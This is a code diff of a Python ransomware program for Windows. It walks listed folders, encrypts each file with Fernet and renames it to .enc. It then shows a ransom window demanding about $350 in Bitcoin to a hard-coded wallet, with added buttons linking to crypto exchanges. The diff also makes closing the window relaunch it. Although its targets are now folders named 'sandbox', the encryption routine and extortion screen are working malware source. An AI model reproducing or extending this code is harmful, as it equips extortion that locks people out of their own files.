@@ -5,23 +5,37 @@ from tkinter import *
 from win32api import GetSystemMetrics 
 import multiprocessing
 from cryptography.fernet import Fernet
-import time
+import webbrowser
 import os
-import ctypes
 
-hostname=socket.gethostname()   
-IPAddr=socket.gethostbyname(hostname)
+hostname=socket.gethostname()    # Get Hostname
+IPAddr=socket.gethostbyname(hostname)   # Get IP
+# This can be used for future features #
 
 root = tk.Tk()
 canvas = Canvas()
-screensize = [f'{GetSystemMetrics(0)}', f'{GetSystemMetrics(1)}']
-btc_wallet=str("bc1qgvsjxmw0t6jcezdxjg7n4yu08t5skm2f36zemt")
-auto_decrypt = int(0)
+screensize = [f'{GetSystemMetrics(0)}', f'{GetSystemMetrics(1)}'] # Get resolution of monitor (1920x1080)
+btc_wallet=str("bc1qgvsjxmw0t6jcezdxjg7n4yu08t5skm2f36zemt") # Bitcoin Addr to show on Msg
+noKey=int(1) # No Decryption Key Requirement #
+# Decryption button requires no key #
 
 user = os.getlogin() # Get Username of PC Directory (users)
 cache_path=str(f"C:\\Users\\{user}\\Documents\\230") # Path to install the virus too ( MUST HAVE \\ not \ )
-cache_name=str(f"encrypted.txt")
-cache_mem=[]
+cache_name=str(f"encrypted.txt") # Cache file name to read and write too
+cache_mem=[] # !DO NOT TOUCH THIS!
+encrypt_directories=[
+                    f'C:\\Users\\{user}\\OneDrive\\Desktop\\sandbox_1',
+                    f'C:\\Users\\{user}\\OneDrive\\Desktop\\sandbox_2',
+                    f'C:\\Users\\{user}\\OneDrive\\Desktop\\sandbox_3',
+                    ]
+
+class api():
+    def open_coinmama():
+        webbrowser.open('www.coinmama.com')
+    def open_moonpay():
+        webbrowser.open('www.moonpay.com/buy/btc')
+    def open_guide():
+        webbrowser.open('https://youtu.be/1ee0OG1fZck')
 
 class win_gui32_Frame():
     def asset_registry():
@@ -42,7 +56,7 @@ Purchasing Bitcoin varies from country to country, You are best advised to do a 
 yourself to find out how to buy Bitcoin.
 Many of our customers have reported these sites to be fast and reliable.
 Coinmama - www.coinmama.com
-Bitpanda - www.moonpay.com/buy/btc
+Moonpay - www.moonpay.com/buy/btc
 
 Payment Information Amount: 0.020892BTC    *(USD$350)*
 Bitcoin Address To Be Used: {btc_wallet}
@@ -60,17 +74,16 @@ Bitcoin Address To Be Used: {btc_wallet}
         adb_text.place(relx=0.02, rely=0.85)
         adb_button.place(relx=0.57, rely=0.9)
         # /?Add Extra Assets Here?/ #
-        #photo = PhotoImage(file="btc.gif")
-        #L1 = Label(root, image=photo)
-        #L1.photo = photo
-        #L1.place(relx=0.73, rely=0.485)
+        adb1_button = Button(root, text="Coinmama", font=("Arial Bold", 8), bg=f"{bge}", fg="white", anchor="w", justify=LEFT, height=1, command = api.open_coinmama)
+        adb2_button = Button(root, text="Moonpay   ", font=("Arial Bold", 8), bg=f"{bge}", fg="white", anchor="w", justify=LEFT, height=1, command = api.open_moonpay)
+        adb1_button.place(relx=0.85, rely=0.85)
+        adb2_button.place(relx=0.85, rely=0.91)
 
 def disable_event():
-    pass
+    win_gui32.restartAssets()
 
 class win_gui32():
     def restartAssets():
-        time.sleep(15)
         win_gui32_Frame.asset_registry()
     def updategui():
         root.update()
@@ -113,33 +126,34 @@ class infec():
             dec_key=f.read()
     def encrypt():
         infec.chk_cache()
-        dic=str(f"C:\\Users\\dnfki\\OneDrive\\Desktop")
-        for root, dirs, files in os.walk(dic):
-            for file in files:
-                if file in cache_mem:
-                    pass
-                else:
-                    try:
-                        if f"{root}\\{file}" in cache_mem:
-                            pass
-                        else:
-                            with open(f"{root}\\{file}", "rb") as readFile:
-                                contents=readFile.read()
-                            contents_encrypted = Fernet(dec_key).encrypt(contents)
-                            with open(f"{root}\\{file}", "wb") as writeFile:
-                                writeFile.write(contents_encrypted)
-                            result = os.path.splitext(file)[0]
-                            fek=str(f"{root}\\{result}.enc")
-                            os.rename(f"{root}\\{file}", f"{fek}")
-                            infec.write_cache(inst=fek)
-                            cache_mem.append(fek)
-                    except:
-                        print(f"IO Error File: {file}")
+        for dic in encrypt_directories:
+            for root, dirs, files in os.walk(dic):
+                for file in files:
+                    if file in cache_mem:
+                        pass
+                    else:
+                        try:
+                            if f"{root}\\{file}" in cache_mem:
+                                pass
+                            else:
+                                with open(f"{root}\\{file}", "rb") as readFile:
+                                    contents=readFile.read()
+                                contents_encrypted = Fernet(dec_key).encrypt(contents)
+                                with open(f"{root}\\{file}", "wb") as writeFile:
+                                    writeFile.write(contents_encrypted)
+                                result = os.path.splitext(file)[0]
+                                fek=str(f"{root}\\{result}.enc")
+                                os.rename(f"{root}\\{file}", f"{fek}")
+                                infec.write_cache(inst=fek)
+                                cache_mem.append(fek)
+                        except:
+                            print(f"IO Error File: {file}")
 
     def decrypt():
-        if auto_decrypt == int(0):
+        if noKey == int(0):
             pass
         else:
+            # Decrypt Files #
             try:
                 p1.terminate()
             except:
@@ -153,18 +167,22 @@ class infec():
                 for lines in f:
                     cache_mem.append(lines)
             for x in cache_mem:
-                try:
-                    if x == "\n":
-                        pass
-                    else:
+                if x == "\n":
+                    pass
+                else:
+                    try:
+                        with open(f"{cache_path}\\c.key", 'rb') as f:
+                            dec_key=f.read()
                         ou=Fernet(dec_key)
                         with open(f"{x}", "r") as get_content:
                             contents=get_content.read()
-                        decryptedContents = ou.decrypt(contents)
+                        decryptedContents = ou.decrypt(contents).decode('utf-8')
                         with open(f"{x}", "w") as write_content:
                             write_content.write(str(decryptedContents))
-                except:
-                    print("IO Error Decrypting File.")
+                    except:
+                        print(f"File Missing: {x}")
+            with open(f"{cache_path}\\{cache_name}", 'w') as clear_cache:
+                clear_cache.write("")
 
 if __name__=="__main__":
     global p1
